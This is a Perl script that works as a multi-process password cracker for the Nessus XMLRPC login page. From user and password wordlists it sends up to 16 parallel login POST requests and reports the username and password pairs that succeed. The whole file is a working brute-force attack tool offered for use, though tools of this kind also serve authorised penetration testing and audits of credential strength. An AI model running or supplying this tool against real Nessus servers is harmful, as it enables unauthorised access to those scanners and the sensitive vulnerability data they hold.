#!/usr/bin/perl
# Nessus XMLRPC password cracker
# Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL.

use strict;

use Getopt::Long;
use LWP::UserAgent;
use HTTP::Request::Common;

my $nessus_url = "https://localhost:8834/login";
my $verbose = 0;
my $debug = 0;
my $userfile;
my $passfile;

my $maxreq = 16;
my @childs;
my $ch=0;
my $total=0;

my $pid = 1;
my $loop = 1;

my $result = GetOptions (
	"u|url=s" => \$nessus_url,
	"U|users=s" => \$userfile,
	"P|passwords=s" => \$passfile,
	"m|maxreq=i" => \$maxreq,
	"v|verbose"  => \$verbose,
	"d|debug" => \$debug,
	"h|help" => \&help
);

unless ($userfile and $passfile) {
	help();
}

print STDERR "Nessus XMLRPC password cracker. (C) Kost. Distributed under GPL.\n\n";

open(USER,"<$userfile") or die ("cannot open user file $userfile: $!");
open(PASS,"<$passfile") or die ("cannot open password file $passfile: $!");

my $userglob = <USER>;
chomp $userglob;

$SIG{INT} = \&ctrlc;
my %comb;

print STDERR "[i] Cracking.\n";
my $starttime=time();

while ($loop) {
	if ($pid) {
		# print STDERR "Main/Parent\n";
		%comb = getcomb();

		if ($comb{'nomore'} == 1) {
			$loop = 0;
			next;
		} 
		if ($ch<$maxreq) {
			$ch++;
			# print STDERR "Forking $ch\n";
			$pid = fork();
			die ("[e] cannot fork: $!") if (!defined($pid));
			if ($pid) {
				push @childs, $pid;
				$total++;
			}
		} else {
			# wait for children to die
			while ($#childs>0) {
				#print STDERR "waiting to die\n";
				if (my $oldpid=waitpid(-1, 0)) {
					# print STDERR "Oldpid: $oldpid\n";
					foreach my $i (0 .. $#childs) {
						next if ($oldpid);
						if ($childs[$i] eq $oldpid) {
							delete $childs[$i];
							last;
						}
					}
					$total++;
					$pid = fork();
					die ("[e] cannot fork in wait: $!") if (!defined($pid)); 
					if ($pid) {
						push @childs, $pid;
						last if ($loop==0);
					} else {
						last;# if children skip while loop

					}
					last; 				
				}
			}
			if ($pid) {%comb = getcomb();}
			next;
		}
	} 
	unless ($pid) {
		# children
		# print STDERR "Children\n";
		guess($comb{'user'},$comb{'pass'});
		exit(0);
	}
}

$SIG{'INT'} = 'DEFAULT';
foreach (@childs) {
	waitpid($_, 0)
}

my $endtime = time();
my $difftime = $endtime - $starttime;

print STDERR "\n";
print STDERR "[i] Statistics: $total tries in $difftime seconds.\n";
print STDERR "[i] END\n";

sub getcomb {
	my %comb;
	while (1) {
	unless ($comb{'pass'} = <PASS>) {
		while (1) {
			unless ($comb{'user'} = <USER>) {
				$comb{'nomore'} = 1;
				return %comb; 
			} else {
				chomp($comb{'user'});
				if ($comb{'user'} eq '') {
					next;
				} else {
					$userglob=$comb{'user'};
					seek (PASS,0,0);
					last;
				}
			}
		}
	} else {
		$comb{'user'}=$userglob;
		chomp($comb{'pass'});
		if ($comb{'pass'} eq '') {
			next;
		} else {
			last 
		}
	}
	}
	$comb{'nomore'} = 0;
	return %comb;
}

sub ctrlc {
	$SIG{INT} = \&ctrlc;
	print "\nCTRL+C presssed, stopping.\n";
	$loop=0;
}

sub guess {
	my ($user, $password) = @_;

	my $post_data = { login => $user, password => $password };

	my $ua = LWP::UserAgent->new;
	my $request = POST $nessus_url, $post_data;

	if ($debug) {
		$ua->add_handler("request_send",  sub { shift->dump; return });
		$ua->add_handler("response_done", sub { shift->dump; return });
	}

	my $result = $ua->request($request);
	if ($result->is_success) {
		if ($result->content =~ /<contents>Invalid login<\/contents>/) {
			print STDERR "[i] Trying $user:$password: Wrong\n" if ($verbose);
		} elsif ($result->content =~ /<status>OK<\/status>/) {
			print STDERR "[i] Trying $user:$password: Success\n" if ($verbose);
			print "[o] Success! User: $user and Password: $password\n";
		} else {
			print STDERR "[i] Trying $user:$password: Unknown\n" if ($verbose);
		}
	} else {
		print STDERR "[i] Trying $user:$password: Cannot login! Check your URL of Nessus!\n"; 
	}
}

sub help 
{
	print "$0: Nessus XMLRPC password cracker. \n";
	print "Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL.\n\n";
	print "Usage: $0 -u https://localhost:8834/login -U userlist.txt -P passlist.txt\n\n";
	print "	-u <U>	use <U> for URL for Nessus login (default: $nessus_url)\n";
	print "	-U <U>	Use user list <U>\n";
	print "	-P <P>	Use password list <P>\n";
	print "	-m <m>	Maximum number of parallel request (default: $maxreq)\n";
	print "	-v	verbose\n";
	print "	-d	debug (be very verbose)\n";
	print "	-h 	this help message\n";
	print "\n";
	exit (0);
} 
